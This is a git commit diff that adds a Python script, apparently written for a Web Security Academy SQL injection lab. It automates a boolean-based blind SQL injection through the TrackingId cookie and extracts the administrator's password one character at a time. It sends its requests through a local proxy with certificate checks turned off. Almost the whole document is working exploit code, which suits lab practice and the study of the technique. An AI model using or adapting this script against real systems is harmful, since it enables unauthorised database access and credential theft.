8f00a019c47f96f58b1f6877d825dca25e103368
Jozenartes <jozenarts12@gmail.com>
2025-06-16 13:55:13 +0100

    Added Payload code

--- 05-SQL-Injection/Blind-SQLI-Scirpt.py
+++ 05-SQL-Injection/Blind-SQLI-Scirpt.py
@@ -1,6 +1,26 @@
 import requests
+import string
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-burp0_url = "https://0aef0073039327e980d5f34f00b80093.web-security-academy.net:443/filter?category=Food+%26+Drink"
-burp0_cookies = {"TrackingId": "zzbxVcuC7vqiNjTt' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')>'a", "session": "6BBk5yRn4oT0eB6d0nhZpybIFyB45KTL"}
-burp0_headers = {"Sec-Ch-Ua": "\"Not.A/Brand\";v=\"99\", \"Chromium\";v=\"136\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aef0073039327e980d5f34f00b80093.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
-requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+proxies  = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+burp0_url = "https://0aaf00c604718da4802c629c009900c4.web-security-academy.net:443/filter?category=Corporate+gifts"
+burp0_cookies = {"TrackingId": "nfi51plVnN2aXTus' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')>'a\"", "session": "cpw52NLzG6rz9Xk8ZB9zKjTBr9AUUJ15"}
+burp0_headers = {"Sec-Ch-Ua": "\"Not.A/Brand\";v=\"99\", \"Chromium\";v=\"136\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aaf00c604718da4802c629c009900c4.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+
+char_set = string.ascii_lowercase + string.digits
+password = ''
+
+for position in range(1,21):
+    for char in char_set:
+        burp0_cookies["TrackingId"] = f"nnfi51plVnN2aXTus' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username = 'administrator')='{char}" 
+        print(f"Testing {position}:{char}")
+        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False, proxies=proxies)
+
+        if "Welcome" in response.text:
+            print(f"[+] found {position}:{char}")
+            password += char
+            break
+
+print(f"Pass: {password}")
